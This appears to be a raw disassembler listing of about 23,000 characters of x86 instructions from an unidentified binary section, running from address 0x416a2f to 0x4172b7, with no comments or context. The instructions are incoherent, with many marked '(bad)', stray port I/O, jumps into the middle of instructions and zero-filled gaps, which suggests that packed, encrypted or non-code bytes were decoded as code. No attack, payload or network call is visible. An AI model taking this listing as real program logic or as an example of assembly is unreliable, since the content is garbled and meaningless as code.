  416a2f:	sbb    cl,BYTE PTR [eax-0x7bcb28d1]
  416a35:	add    esp,DWORD PTR [eax-0xfd484d9]
  416a3b:	push   esi
  416a3c:	mov    BYTE PTR [edi],ch
  416a3e:	enter  0x8652,0x3e
  416a42:	test   al,0x23
  416a44:	out    0x34,eax
  416a46:	(bad)  
  416a47:	and    eax,0x398e2955
  416a4c:	or     eax,0x401a8735
  416a51:	xor    BYTE PTR [ebx-0x72d4a5fa],dl
  416a57:	sbb    al,0x56
  416a59:	sub    al,BYTE PTR [ecx+0x7c3c32dc]
  416a5f:	push   es
  416a60:	add    BYTE PTR [edx],bh
  416a62:	sbb    esp,DWORD PTR [esi+ebp*2]
  416a65:	sbb    bh,BYTE PTR ds:[eax]
  416a68:	xor    dl,bh
  416a6a:	comiss xmm6,DWORD PTR [ecx+ebp*8+0x1c]
  416a6f:	es gs pop es
  416a72:	sbb    DWORD PTR ds:0x39d9da71,ebx
  416a78:	js     0x416a77
  416a7a:	repz out 0x31,eax
  416a7d:	or     ch,ah
  416a7f:	out    0x31,eax
  416a81:	or     eax,0x431e7f4
  416a86:	in     al,dx
  416a87:	push   edi
  416a88:	inc    ebx
  416a89:	mov    ch,0xde
  416a8b:	inc    edi
  416a8c:	push   esp
  416a8d:	or     esp,eax
  416a8f:	sbb    esi,DWORD PTR [ecx-0x23]
	...
  416aa2:	add    BYTE PTR [eax],al
  416aa4:	(bad)  [ebp+0x6b]
  416aa7:	les    ecx,FWORD PTR [edi-0x2b289cf3]
  416aad:	cmp    BYTE PTR [edi-0x47],dh
  416ab0:	(bad)  
  416ab1:	sub    DWORD PTR [esp+ebx*4+0x24],esp
  416ab5:	sub    dh,BYTE PTR [edx-0x41]
  416ab8:	adc    ah,BYTE PTR [edx]
  416aba:	arpl   bp,dx
  416abc:	push   ebx
  416abd:	sub    BYTE PTR [esi-0x76],ch
  416ac0:	sbb    eax,0xee9d7036
  416ac5:	and    dl,BYTE PTR [eax-0x78]
  416ac8:	cld    
  416ac9:	aaa    
  416aca:	jne    0x416a62
  416acc:	add    eax,0x9da72023
  416ad1:	cmp    ecx,DWORD PTR [ebx-0x37]
  416ad4:	(bad)  
  416ad5:	sbb    edi,DWORD PTR [edx-0x72]
  416ad8:	iret   
  416ad9:	sbb    esp,DWORD PTR [ebp+0x50]
  416adc:	(bad)  
  416add:	aaa    
  416ade:	add    BYTE PTR [edi],ah
  416ae0:	lds    edi,FWORD PTR [eax]
  416ae2:	arpl   WORD PTR [edi-0x29],cx
  416ae5:	add    BYTE PTR cs:0x7a1bb9,ch
  416aec:	mov    al,ds:0xd5616bde
  416af1:	in     al,dx
  416af2:	fs jb  0x416b31
  416af5:	or     eax,0x2f5786b
  416afa:	dec    edi
  416afb:	outs   dx,DWORD PTR ds:[esi]
  416afc:	out    dx,eax
  416afd:	div    BYTE PTR [edx+0x61]
  416b00:	sti    
  416b01:	in     eax,0x5b
  416b03:	dec    ebp
  416b04:	div    al
  416b06:	fs ins BYTE PTR es:[edi],dx
	...
  416b18:	add    BYTE PTR [eax],al
  416b1a:	(bad)
  416b1d:	sub    al,0xa4
  416b1f:	lahf   
  416b20:	std    
  416b21:	gs mov ebp,0xb62f39f8
  416b27:	or     BYTE PTR [eax+0x74],ch
  416b2a:	popf   
  416b2b:	clc    
  416b2c:	cmp    DWORD PTR [edi],ebp
  416b2e:	push   es
  416b2f:	add    ebp,DWORD PTR [eax+0x74]
  416b32:	mov    ebp,0xf63a6ef8
  416b37:	mov    ds:0xf89d65fd,eax
  416b3c:	sub    eax,0x71dbaf00
  416b41:	gs dec edi
  416b43:	cmp    al,0x50
  416b45:	jae    0x416b77
  416b47:	fsub   QWORD PTR [eax+0x73]
  416b4a:	addr16 or al,0x5d
  416b4d:	je     0x416b98
  416b4f:	pop    ecx
  416b50:	popa   
  416b51:	popa   
  416b52:	test   ch,ah
  416b54:	ins    DWORD PTR es:[edi],dx
  416b55:	imul   edi,DWORD PTR [ebx+ebp*8-0x1],0x5b
  416b5a:	fs in  eax,0x79
  416b5d:	imul   esp,DWORD PTR [ebp-0x1c],0xe75a5c5c
  416b64:	pop    esp
  416b65:	dec    ebp
  416b66:	jbe    0x416b4a
  416b68:	data16 mov al,gs:0xc5460053
  416b6f:	jecxz  0x416bcf
  416b71:	imul   ecx,DWORD PTR [ecx],0x54
  416b74:	inc    esi
  416b75:	ins    BYTE PTR es:[edi],dx
  416b76:	lock inc esp
  416b78:	and    DWORD PTR [ecx-0x5c],ebp
  416b7b:	fbstp  TBYTE PTR [ecx]
  416b7d:	ins    DWORD PTR es:[edi],dx
	...
  416b8e:	add    BYTE PTR [eax],al
  416b90:	xchg   eax,esi
  416b92:	push   ds
  416b93:	jb     0x416b29
  416b95:	popf   
  416b96:	dec    eax
  416b97:	ins    DWORD PTR es:[edi],dx
  416b98:	push   0x47
  416b9a:	sub    BYTE PTR [ecx+edx*2-0x62],ch
  416b9e:	push   ebp
  416b9f:	dec    ebx
  416ba0:	dec    edi
  416ba1:	call   0xff85d7d0
  416ba6:	push   edi
  416ba7:	push   eax
  416ba8:	inc    edx
  416ba9:	add    eax,0x354671e
  416bae:	xor    DWORD PTR [eax+esi*8+0x10],ebx
  416bb2:	and    eax,0x24b53c66
  416bb7:	jb     0x416bce
  416bb9:	adc    cl,BYTE PTR [eax+0x63]
  416bbc:	or     eax,0x44462c01
  416bc1:	outs   dx,BYTE PTR ds:[esi]
  416bc2:	add    DWORD PTR [edi],edi
  416bc4:	and    dh,cl
  416bc6:	cmp    eax,0x459e0267
  416bcb:	ins    DWORD PTR es:[edi],dx
  416bcc:	adc    edi,DWORD PTR [edi+0x70094425]
  416bd2:	add    DWORD PTR [edx+0x7],esp
  416bd5:	mov    ebp,0x6fd16b2a
  416bda:	sub    ch,BYTE PTR [esi]
  416bdc:	int3   
  416bdd:	mov    esi,0x96c3002d
  416be2:	sub    eax,0x1b7ba963
  416be7:	ins    DWORD PTR es:[edi],dx
  416be8:	push   ds
  416be9:	outs   dx,DWORD PTR ds:[esi]
  416bea:	cmp    edx,DWORD PTR [eax-0x10]
  416bed:	mov    WORD PTR ds:0x3b9dce67,ds
  416bf3:	pop    edi
	...
  416c04:	add    BYTE PTR [eax],al
  416c06:	mov    esi,0xa4672f7c
  416c0b:	jp     0x416c3f
  416c0d:	mov    WORD PTR cs:[esi+0x2d],?
  416c11:	add    bh,al
  416c13:	push   es
  416c14:	push   eax
  416c15:	es scas al,BYTE PTR es:[edi]
  416c17:	push   edx
  416c18:	aaa    
  416c19:	add    al,0x81
  416c1b:	sbb    eax,0xdc811f5b
  416c20:	inc    edx
  416c21:	and    dh,al
  416c23:	inc    edi
  416c24:	xor    edx,DWORD PTR [ecx-0x51]
  416c27:	inc    edx
  416c28:	sbb    edi,DWORD PTR [ecx]
  416c2a:	pop    ds
  416c2b:	clc    
  416c2c:	sub    ebx,esi
  416c2e:	xor    esi,edx
  416c30:	repnz repnz or cl,BYTE PTR [eax-0x20]
  416c35:	out    dx,al
  416c36:	xor    esp,ebx
  416c38:	xlat   BYTE PTR ds:[ebx]
  416c39:	repnz push ebx
  416c3b:	cmc    
  416c3c:	ret    
  416c3d:	sti    
  416c3e:	push   es
  416c3f:	out    dx,eax
  416c40:	(bad)  
  416c41:	out    0xf,al
  416c43:	idiv   DWORD PTR [esi+0x2942f6f3]
  416c49:	icebp  
  416c4a:	loope  0x416c8c
  416c4c:	sub    eax,0x204b2af0
  416c51:	es inc eax
  416c53:	xor    eax,0x244120d6
  416c58:	fldcw  WORD PTR ds:0xf21a3513
  416c5e:	xchg   DWORD PTR ds:0x240631c4,esi
  416c64:	mov    ecx,0xcc2ec630
  416c69:	daa    
	...
  416c7a:	add    BYTE PTR [eax],al
  416c7c:	lock dec edx
  416c7e:	lods   eax,DWORD PTR ds:[esi]
  416c7f:	dec    edi
  416c80:	rol    BYTE PTR [ecx-0x3c],0x2f
  416c84:	in     al,0x23
  416c86:	cdq    
  416c87:	add    esi,DWORD PTR [ebx-0x2de04cab]
  416c8d:	hlt    
  416c8e:	les    ebx,FWORD PTR [edi]
  416c90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c91:	xor    ah,bh
  416c93:	push   edx
  416c94:	mov    ah,0x27
  416c96:	jnp    0x416cba
  416c98:	push   es
  416c99:	and    ecx,DWORD PTR [eax+0x4af02f]
  416c9f:	lods   al,BYTE PTR ds:[esi]
  416ca0:	loopne 0x416cd4
  416ca2:	jno    0x416d22
  416ca4:	std    
  416ca5:	xor    bl,BYTE PTR [eax+ebp*1-0x58]
  416ca9:	inc    eax
  416caa:	push   esp
  416cab:	cmp    esp,esi
  416cad:	inc    ecx
  416cae:	outs   dx,BYTE PTR ds:[esi]
  416caf:	pop    ebp
  416cb0:	out    0x34,eax
  416cb2:	outs   dx,BYTE PTR ds:[esi]
  416cb3:	inc    esp
  416cb4:	shl    dh,0x42
  416cb7:	inc    ecx
  416cb8:	mov    esp,0xf3b6d1a
  416cbd:	xor    eax,0x191b1e00
  416cc2:	addr16 aas 
  416cc4:	push   DWORD PTR [edx]
  416cc6:	inc    ecx
  416cc7:	or     BYTE PTR [ecx],dl
  416cc9:	pop    ds
  416cca:	arpl   WORD PTR [edx],bp
  416ccc:	add    ah,BYTE PTR [esi]
  416cce:	fs or  al,0xe
  416cd1:	xor    esp,DWORD PTR [edi+0x8]
  416cd4:	or     BYTE PTR [eax],bh
  416cd6:	add    BYTE PTR [ecx+eiz*1],dh
  416cd9:	out    0x46,eax
  416cdb:	and    al,0x94
  416cdd:	inc    ebx
  416cde:	push   esp
  416cdf:	sbb    DWORD PTR [eax],eax
	...
  416cf1:	add    BYTE PTR [ecx+edi*1+0x33e0fa5f],cl
  416cf8:	ins    DWORD PTR es:[edi],dx
  416cf9:	fcomi  st,st(7)
  416cfb:	aaa    
  416cfc:	add    BYTE PTR [ebp-0x5fb015dd],ah
  416d02:	mov    DWORD PTR [ecx],ecx
  416d04:	add    cl,bl
  416d06:	shl    BYTE PTR [edx],0x6d
  416d09:	mov    ebx,0xc52e27d6
  416d0e:	pop    ss
  416d0f:	sbb    eax,DWORD PTR [eax]
  416d11:	cdq    
  416d12:	shl    BYTE PTR [edx],0x6d
  416d15:	mov    ebx,0x8c7247fe
  416d1a:	adc    dh,BYTE PTR [ebx]
  416d1c:	arpl   WORD PTR [eax-0x778bc7eb],si
  416d22:	or     eax,0xf3e96328
  416d27:	daa    
  416d28:	jb     0x416d2a
  416d2a:	jo     0x416d21
  416d2c:	jae    0x416d61
  416d2e:	imul   esp,DWORD PTR [ebx+0x56d6c61],0x3f
  416d35:	jb     0x416cd7
  416d37:	cmc    
  416d38:	jae    0x416d8f
  416d3a:	mov    edi,0xa56f71f2
  416d3f:	fistp  WORD PTR [esi+0x74]
  416d42:	aad    0xe3
  416d44:	jae    0x416da7
  416d46:	or     DWORD PTR ds:0x5090000,eax
  416d4c:	add    BYTE PTR [eax],al
  416d4e:	fld    DWORD PTR [eax+eax*1]
  416d51:	inc    eax
  416d52:	adc    ebp,DWORD PTR [ecx+edi*1+0xe4]
	...
  416d65:	add    BYTE PTR [eax],al
  416d67:	add    BYTE PTR [ebx-0x3c],ah
  416d6a:	or     eax,0xaa030cbf
  416d6f:	add    al,ah
  416d71:	cmp    al,0xee
  416d73:	inc    ecx
  416d74:	adc    ebp,DWORD PTR [ecx+edi*1+0xdc423e4]
  416d7b:	mov    edi,0xaa02ec
  416d80:	add    BYTE PTR ds:0xabd342ee,bh
  416d86:	cmp    esp,esp
  416d88:	jecxz  0x416d4d
  416d8a:	or     eax,0xaa048cbf
  416d8f:	add    BYTE PTR [eax-0x66c011c2],ah
  416d95:	add    al,0x0
  416d97:	and    eax,0x55b0d9
  416d9c:	pop    edx
  416d9d:	in     eax,0x65
  416d9f:	je     0x416d47
  416da1:	jecxz  0x416e14
  416da3:	gs jge 0x416ded
  416da6:	arpl   WORD PTR gs:[ebx+0x676f6ee5],bx
  416dad:	lock pop ebx
  416daf:	dec    ecx
  416db0:	jg     0x416da2
  416db2:	pusha  
  416db3:	jb     0x416da5
  416db5:	jg     0x416ddf
  416db7:	je     0x416dc9
  416db9:	arpl   WORD PTR [ecx],bp
  416dbb:	jo     0x416d81
  416dbd:	nop
  416dbe:	xor    esp,DWORD PTR [ebx-0x5e]
  416dc1:	mov    DWORD PTR [esi+ebp*2],edi
  416dc4:	pushf  
  416dc5:	jp     0x416de4
  416dc7:	ins    BYTE PTR es:[edi],dx
  416dc8:	mov    DWORD PTR [edi+0x22],ebx
  416dcb:	jb     0x416dcd
	...
  416ddd:	add    BYTE PTR [ebp-0x7baeafb4],al
  416de3:	cmp    BYTE PTR [esi],dh
  416de5:	pop    edi
  416de6:	(bad)  
  416de7:	cmp    dh,dh
  416de9:	(bad)  
  416dea:	call   FWORD PTR [ebp-0x626effff]
  416df0:	and    eax,DWORD PTR [eax]
  416df2:	push   ebp
  416df3:	sahf   
  416df4:	repz call FWORD PTR [edi]
  416df7:	sahf   
  416df8:	idiv   edi
  416dfa:	sbb    BYTE PTR [esi-0x61faffd9],bl
  416e00:	in     al,dx
  416e01:	call   DWORD PTR [ecx-0x62]
  416e04:	cmc    
  416e05:	(bad)  
  416e06:	(bad)  
  416e07:	popf   
  416e08:	loopne 0x416e09
  416e0a:	add    ebx,DWORD PTR [esi-0x61b3ffda]
  416e10:	in     al,dx
  416e11:	(bad)  
  416e12:	fcomp  QWORD PTR [ebp-0x621cffdc]
  416e18:	clc    
  416e19:	jmp    edi
  416e1b:	popf   
  416e1c:	loopne 0x416e1d
  416e1e:	adc    bl,BYTE PTR [esi-0x623e000d]
  416e24:	in     al,dx
  416e25:	call   edi
  416e27:	popf   
  416e28:	cmc    
  416e29:	call   DWORD PTR [ebx]
  416e2b:	sahf   
  416e2c:	and    eax,DWORD PTR [eax]
  416e2e:	adc    DWORD PTR [esi-0x622a0006],ebx
  416e34:	cli    
  416e35:	jmp    DWORD PTR [edi-0x63]
  416e38:	inc    eax
  416e39:	shr    DWORD PTR [bp+di+0x22],cl
  416e3d:	jno    0x416e06
  416e3f:	push   es
  416e40:	lea    esi,[edi]
	...
  416e52:	add    BYTE PTR [eax],al
  416e54:	lods   eax,DWORD PTR ds:[esi]
  416e55:	dec    edi
  416e56:	nop
  416e57:	and    DWORD PTR [edi-0x62c873e8],ebp
  416e5d:	fsubr  st(6),st
  416e5f:	sub    DWORD PTR [esi+esi*1+0x6dce2c1],edi
  416e66:	call   0xa224:0x7e328e22
  416e6d:	and    DWORD PTR [ebx+0x49178c44],ecx
  416e73:	daa    
  416e74:	lods   al,BYTE PTR ds:[esi]
  416e75:	inc    ebx
  416e76:	dec    esi
  416e77:	pop    ds
  416e78:	fwait
  416e79:	pop    ss
  416e7a:	inc    ebp
  416e7b:	add    al,0xa1
  416e7d:	sbb    eax,0x21a12753
  416e82:	cmp    DWORD PTR [edx],edi
  416e84:	push   ebx
  416e85:	sbb    DWORD PTR [edx],edi
  416e87:	add    al,0x41
  416e89:	xor    BYTE PTR [ebx],bh
  416e8b:	daa    
  416e8c:	inc    ecx
  416e8d:	sub    al,0x39
  416e8f:	cmp    dl,BYTE PTR [ebx+0x19]
  416e92:	(bad)  
  416e93:	out    0x53,al
  416e95:	inc    ebx
  416e96:	das    
  416e97:	and    DWORD PTR [ecx+0x1b],eax
  416e9a:	out    0x54,eax
  416e9c:	push   edi
  416e9d:	sbb    eax,DWORD PTR [edx*2+0x26fd1953]
  416ea4:	and    ah,bh
  416ea6:	ret    
  416ea7:	daa    
  416ea8:	inc    esp
  416ea9:	ds or  al,0x26
  416eac:	inc    ebx
  416ead:	sbb    ebx,edi
  416eaf:	add    eax,DWORD PTR [ecx+0x30]
  416eb2:	(bad)  [esi]
  416eb4:	and    DWORD PTR [ecx+ebx*8],ebp
  416eb7:	cmp    DWORD PTR [eax],eax
	...
  416ec9:	add    BYTE PTR [ebx],dl
  416ecb:	sbb    DWORD PTR [edi],eax
  416ecd:	out    0x13,eax
  416ecf:	inc    ebx
  416ed0:	mov    ecx,0xbb360b26
  416ed5:	adc    BYTE PTR es:[ebx-0x30],cl
  416ed9:	xor    eax,0xbd0029d3
  416ede:	adc    BYTE PTR [ecx],bl
  416ee0:	ja     0x416ecb
  416ee2:	mov    esp,0xa48c742d
  416ee7:	sub    DWORD PTR [edx-0x69],esi
  416eea:	push   cs
  416eeb:	sbb    DWORD PTR [eax],esp
  416eed:	int3   
  416eee:	pop    ss
  416eef:	repnz push edx
  416ef1:	call   0x1b0a:0x9a00190e
  416ef8:	arpl   WORD PTR [edx-0x7389e732],bx
  416efe:	in     eax,0xe6
  416f00:	and    al,BYTE PTR [ebp+0x4c713936]
  416f06:	(bad)  
  416f07:	out    0x4f,al
  416f09:	ss in  al,dx
  416f0b:	jmp    0x29fea480
  416f10:	ja     0x416f5c
  416f12:	aam    0x45
  416f14:	addr16 push edi
  416f16:	hlt    
  416f17:	aaa    
  416f18:	addr16 xor eax,0x3b63380f
  416f1e:	sbb    ch,BYTE PTR [edx]
  416f20:	jb     0x416f2b
  416f22:	iret   
  416f23:	sub    DWORD PTR [edx+edi*1+0x3a],ebx
  416f27:	cmp    edx,DWORD PTR [eax-0x17]
  416f2a:	das    
  416f2b:	sub    ch,BYTE PTR [esp+ebx*1+0x0]
	...
  416f3f:	add    BYTE PTR [edx+ebp*1],cl
  416f42:	inc    esi
  416f43:	xor    eax,0x1071071c
  416f48:	call   0xdc10e076
  416f4d:	xor    DWORD PTR [ecx+ebp*8+0x38],ebp
  416f51:	sub    ah,BYTE PTR [edx-0x37]
  416f54:	das    
  416f55:	inc    esi
  416f56:	je     0x416f20
  416f58:	repz push edx
  416f5a:	ins    DWORD PTR es:[edi],dx
  416f5b:	(bad)  
  416f5c:	jmp    0x5f1a:0xd2ad2034
  416f63:	jmp    0x8dc584
  416f68:	inc    eax
  416f69:	frstor [eax+0x20]
  416f6c:	das    
  416f6d:	out    0x71,al
  416f6f:	ins    DWORD PTR es:[edi],dx
  416f70:	sub    ch,bl
  416f72:	pop    ds
  416f73:	xor    ecx,DWORD PTR [ecx-0x23]
  416f76:	pop    esp
  416f77:	bound  esp,QWORD PTR [ebp-0x14]
  416f7a:	jmp    DWORD PTR [edi]
  416f7c:	pop    ecx
  416f7d:	sar    ch,0x1f
  416f80:	dec    ecx
  416f81:	dec    edx
  416f82:	dec    ebx
  416f83:	dec    esi
  416f84:	jp     0x416fc3
  416f86:	push   edx
  416f87:	inc    ecx
  416f88:	pusha  
  416f89:	inc    edi
  416f8a:	push   esp
  416f8b:	add    BYTE PTR [ecx+0x484d453b],cl
  416f91:	cmp    edx,DWORD PTR [ebp+0x0]
  416f94:	jl     0x416fdd
  416f96:	inc    ebp
  416f97:	push   ecx
  416f98:	int3   
  416f99:	dec    edi
  416f9a:	add    BYTE PTR [ebx-0x3f],al
  416f9d:	dec    edi
  416f9e:	aas    
  416f9f:	dec    ebx
  416fa0:	or     DWORD PTR [ebx+0x4b],ecx
  416fa3:	push   edx
	...
  416fb4:	add    BYTE PTR [eax],al
  416fb6:	int3   
  416fb7:	jecxz  0x416ffb
  416fb9:	dec    esi
  416fba:	(bad)  [eax]
  416fbc:	ins    BYTE PTR es:[edi],dx
  416fbd:	outs   dx,DWORD PTR ds:[esi]
  416fbe:	add    ch,BYTE PTR cs:[esi+0x73]
  416fc2:	leave  
  416fc3:	add    eax,0x22e6972
  416fc8:	outs   dx,BYTE PTR ds:[esi]
  416fc9:	pop    edi
  416fca:	in     al,dx
  416fcb:	fsubr  DWORD PTR [ebx+0x0]
  416fce:	jmp    0xdeb4debc
  416fd3:	add    esi,DWORD PTR [edx+0x64]
  416fd6:	push   es
  416fd7:	fstp   QWORD PTR [esp+ebp*2-0x54]
  416fdb:	out    dx,eax
  416fdc:	push   DWORD PTR [edx+ebp*4-0x11]
  416fe0:	jno    0x417050
  416fe2:	call   0x9fa0d0cc
  416fe7:	jmp    0x417054
  416fe9:	jne    0x416fa7
  416feb:	or     BYTE PTR [esi+0x74],ah
  416fee:	test   eax,0xf02f2cae
  416ff3:	lods   eax,DWORD PTR ds:[esi]
  416ff4:	sbb    DWORD PTR [esp+edi*8-0x43],esi
  416ff8:	out    0x2c,eax
  416ffa:	pop    ds
  416ffb:	scas   al,BYTE PTR es:[edi]
  416ffc:	sbb    DWORD PTR [esp+ebx*8+0x5d],esi
  417000:	xor    bh,BYTE PTR [edx]
  417002:	prefetch BYTE PTR [esp+ebx*2]
  417006:	scas   eax,DWORD PTR es:[edi]
  417007:	fs push ds
  417009:	fcom   QWORD PTR gs:[edx+0x7fd8414d]
  417010:	push   ds
  417011:	imul   edx,ebp,0xffffffad
  417014:	dec    ebp
  417015:	inc    ecx
  417016:	enter  0x1e7f,0x6b
	...
  41702a:	add    BYTE PTR [eax],al
  41702c:	cdq    
  41702d:	and    ah,BYTE PTR [eax]
  41702f:	add    ah,al
  417031:	jo     0x41704c
  417033:	jb     0x416fc4
  417035:	mov    ch,BYTE PTR [eax]
  417037:	push   eax
  417038:	test   BYTE PTR [edx],bl
  41703a:	xor    al,BYTE PTR [eax]
  41703c:	mov    ds:0x7f74263c,eax
  417041:	dec    esi
  417042:	xor    ah,BYTE PTR [ebx-0x64]
  417045:	lock sbb esi,DWORD PTR [edx-0x79]
  417049:	loop   0x417071
  41704b:	push   eax
  41704c:	pop    esp
  41704d:	jecxz  0x41707f
  41704f:	add    BYTE PTR [ecx],bh
  417051:	push   esp
  417052:	xor    DWORD PTR [ecx+edx*2+0x4a],esi
  417056:	and    BYTE PTR [ebp+0x2c],bl
  417059:	inc    edi
  41705a:	xor    al,BYTE PTR [eax]
  41705c:	sub    al,0xf0
  41705e:	xor    DWORD PTR [ebp+0x55],ebp
  417061:	div    DWORD PTR [esi]
  417063:	imul   esi,eax,0xffffffd9
  417066:	cmp    eax,0x32065367
  41706b:	ins    DWORD PTR es:[edi],dx
  41706c:	sbb    eax,0x335c0413
  417071:	adc    eax,0xd146d1f
  417076:	add    al,0x5c
  417078:	inc    edx
  417079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41707a:	and    ch,BYTE PTR [ecx+0x3d]
  41707d:	pop    es
  41707e:	int3   
  41707f:	pop    ds
  417080:	cld    
  417081:	push   es
  417082:	mov    dl,0xe0
  417084:	sub    ch,BYTE PTR [edx]
  417086:	ret    
  417087:	sub    BYTE PTR ds:0xb94fe735,al
  41708d:	icebp  
  41708e:	mov    bl,0x28
	...
  4170a0:	add    BYTE PTR [eax],al
  4170a2:	aam    0x29
  4170a4:	into   
  4170a5:	sbb    eax,0x319742f0
  4170aa:	lds    ebp,FWORD PTR [eax+eax*8]
  4170ad:	pop    ds
  4170ae:	rcl    DWORD PTR [edi],cl
  4170b0:	out    0x48,eax
  4170b2:	shr    BYTE PTR ds:0x499c038a,0x97
  4170b9:	sbb    al,0xd1
  4170bb:	inc    edx
  4170bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170bd:	xor    edx,DWORD PTR [edi-0x63ad18d9]
  4170c3:	and    eax,0x4ccb2585
  4170c8:	fwait
  4170c9:	push   ebx
  4170ca:	lock pop ss
  4170cc:	xor    BYTE PTR [edi],0x93
  4170cf:	pop    ss
  4170d0:	adc    eax,0xe72d961b
  4170d5:	dec    edi
  4170d6:	mov    eax,ds:0x81275b2d
  4170db:	push   es
  4170dc:	sub    edx,DWORD PTR [esi+0x57]
  4170df:	push   ss
  4170e0:	push   eax
  4170e1:	and    DWORD PTR [ebp+0x34],edx
  4170e4:	pop    es
  4170e5:	aas    
  4170e6:	push   ebx
  4170e7:	sub    eax,DWORD PTR [eax+0x23]
  4170ea:	lock lock inc esp
  4170ed:	cmp    BYTE PTR [eax+0x7],al
  4170f0:	cmp    al,BYTE PTR [ebx+edx*2]
  4170f3:	pop    es
  4170f4:	adc    eax,DWORD PTR [esp+eax*2]
  4170f7:	pop    es
  4170f8:	add    BYTE PTR [esi+eax*2],al
  4170fb:	pop    es
  4170fc:	push   es
  4170fd:	add    al,0x21
  4170ff:	pop    es
  417100:	out    0x3,eax
  417102:	inc    esp
  417103:	dec    edx
  417104:	or     ebx,DWORD PTR ds:0x0
	...
  417116:	add    BYTE PTR [eax],al
  417118:	adc    ch,BYTE PTR [eax]
  41711a:	add    BYTE PTR ds:0xf66d468c,al
  417120:	in     eax,dx
  417121:	xor    ch,BYTE PTR [ebp-0x38]
  417124:	iret   
  417125:	and    eax,0x4e20e972
  41712a:	cs enter 0x27c1,0x68
  41712f:	jmp    0xbaa485e9
  417134:	or     ecx,DWORD PTR [ecx+0x54]
  417137:	cdq    
  417138:	repz lock push eax
  41713b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41713c:	lods   eax,DWORD PTR ds:[esi]
  41713d:	push   es
  41713e:	inc    edx
  41713f:	mov    ebp,0xaf631d12
  417144:	call   DWORD PTR [esi]
  417146:	add    BYTE PTR [edx-0x389ce526],bl
  41714c:	cmovb  esi,DWORD PTR [ecx+ebp*8-0x11]
  417151:	inc    ecx
  417152:	jno    0x4171d1
  417154:	ret    
  417155:	inc    ecx
  417156:	jno    0x4171d2
  417158:	in     al,0x33
  41715a:	jb     0x4170e9
  41715c:	repz push edx
  41715e:	pop    edi
  41715f:	jp     0x417128
  417161:	loope  0x4171c6
  417163:	dec    ebp
  417164:	ret    0x7125
  417167:	pop    edx
  417168:	hlt    
  417169:	push   edx
  41716a:	pop    edi
  41716b:	pop    edx
  41716c:	mov    eax,0x22447135
  417171:	pop    es
  417172:	dec    esp
  417173:	dec    eax
  417174:	and    DWORD PTR [ebx],ebx
  417176:	push   eax
  417177:	dec    esi
  417178:	and    bl,BYTE PTR [ebx]
  41717a:	add    BYTE PTR [edx],bl
	...
  41718c:	add    BYTE PTR [eax],al
  41718e:	cmc    
  41718f:	sub    BYTE PTR [esi+esi*1+0x13],dh
  417193:	adc    eax,0x332e4563
  417198:	pop    edi
  417199:	sbb    bl,ah
  41719b:	arpl   WORD PTR ss:[eax],cx
  41719e:	fld    DWORD PTR [edx+0x42]
  4171a1:	std    
  4171a2:	rcr    BYTE PTR [ebx+eiz*2],cl
  4171a5:	add    bh,dl
  4171a7:	fisubr WORD PTR [edi+0x5c]
  4171aa:	cli    
  4171ab:	jmp    0x131e623
  4171b0:	arpl   WORD PTR [ebx-0x67],si
  4171b3:	push   ecx
  4171b4:	inc    edx
  4171b5:	ins    BYTE PTR es:[edi],dx
  4171b6:	mov    eax,0xa54660ef
  4171bb:	aad    0xff
  4171bd:	sub    eax,0x6bd5a7
  4171c2:	xchg   edi,eax
  4171c3:	cmp    DWORD PTR [eax+0x2b],edx
  4171c6:	add    al,cl
  4171c8:	dec    ecx
  4171c9:	imul   ebp,DWORD PTR [edi],0x31735bfe
  4171cf:	call   0x2bede3f
  4171d4:	jo     0x41723b
  4171d6:	pop    edi
  4171d7:	push   ecx
  4171d8:	pop    edi
  4171d9:	outs   dx,DWORD PTR ds:[esi]
  4171da:	ins    BYTE PTR es:[edi],dx
  4171db:	add    BYTE PTR [ebp+0x6e],bl
  4171de:	gs add eax,0x39576f43
  4171e4:	push   eax
  4171e5:	add    BYTE PTR [edx+0x2],bl
  4171e8:	outs   dx,BYTE PTR ds:[esi]
  4171e9:	outs   dx,BYTE PTR ds:[esi]
  4171ea:	je     0x4171d2
  4171ec:	jae    0x417257
  4171ee:	outs   dx,BYTE PTR ds:[esi]
  4171ef:	add    ebp,DWORD PTR [edi+0x2e]
	...
  417202:	add    BYTE PTR [eax],al
  417204:	test   ebp,ebp
  417206:	jae    0x417208
  417208:	jmp    0x3a:0xc5462946
  41720f:	jae    0x4171c1
  417211:	(bad)  
  417212:	pusha  
  417213:	jae    0x417204
  417215:	add    ebp,DWORD PTR [esi+0x69]
  417218:	(bad)  [eax+0x2f]
  41721b:	inc    esp
  41721c:	in     al,dx
  41721d:	inc    esp
  41721e:	push   esp
  41721f:	push   eax
  417220:	leave  
  417221:	dec    eax
  417222:	dec    edi
  417223:	imul   eax,DWORD PTR ds:0xea6543e6,0xf46e6301
  41722d:	fdivr  st,st(7)
  41722f:	push   edx
  417230:	lock call 0xef88c677
  417236:	push   ebp
  417237:	inc    ebx
  417238:	inc    esp
  417239:	in     eax,dx
  41723a:	pop    ss
  41723b:	pop    edi
  41723c:	and    ebx,DWORD PTR [ebp+0x2347120]
  417242:	sub    esi,DWORD PTR [eax+0x15]
  417245:	add    bl,BYTE PTR [ebx]
  417247:	bound  esp,QWORD PTR [eiz*4-0x63fc8c1]
  41724e:	hlt    
  41724f:	inc    eax
  417250:	mov    eax,0x2645d6f5
  417255:	push   0x9e212af3
  41725a:	hlt    
  41725b:	ds or  eax,0x1940f66f
  417261:	or     esi,esp
  417263:	aaa    
  417264:	add    BYTE PTR [esi+0x41f3],bl
	...
  41727a:	add    dh,BYTE PTR [eax-0x13]
  41727d:	ss mov dh,0x6b
  417280:	sub    BYTE PTR [ecx+eax*1-0x38],bl
  417284:	repz pop ebx
  417286:	loopne 0x4172f9
  417288:	xor    ah,BYTE PTR [edi-0x6a]
  41728b:	pop    esp
  41728c:	repz push DWORD PTR [esi+ecx*4-0x7e5188ca]
  417294:	push   ecx
  417295:	add    BYTE PTR [edi+edi*2+0x4ea37420],ch
  41729c:	ss pop edi
  41729e:	mov    cs,WORD PTR [eax+0x4]
  4172a1:	cs js  0x4172f3
  4172a4:	xor    al,0x0
  4172a6:	push   ds
  4172a7:	cmp    al,0x20
  4172a9:	jo     0x41729b
  4172ab:	add    DWORD PTR [edi],edi
  4172ad:	push   edx
  4172ae:	sub    eax,0x75655fd
  4172b3:	add    al,0x4
  4172b5:	jo     0x417308
  4172b7:	fnsave [esi*2+0x20190757]
